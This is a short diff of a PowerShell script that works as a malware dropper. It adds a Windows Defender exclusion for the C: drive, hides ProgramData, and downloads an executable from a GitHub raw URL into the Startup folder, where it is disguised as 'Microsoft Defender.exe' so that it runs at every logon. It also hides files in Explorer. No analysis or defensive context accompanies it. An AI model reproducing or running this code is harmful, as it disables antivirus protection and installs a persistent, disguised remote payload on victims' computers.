@@ -1,4 +1,4 @@
-Add-MpPreference -ExclusionPath "C:\", "D:\", "E:\", "F:\"
+Add-MpPreference -ExclusionPath "C:\"
 attrib +s +h "C:\ProgramData\"
 Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/vibha000x7/ViaProxy-3.3.3-Java8/refs/heads/main/test.exe' -OutFile "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\Microsoft Defender.exe"
 Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" -Name "Hidden" -Value 1
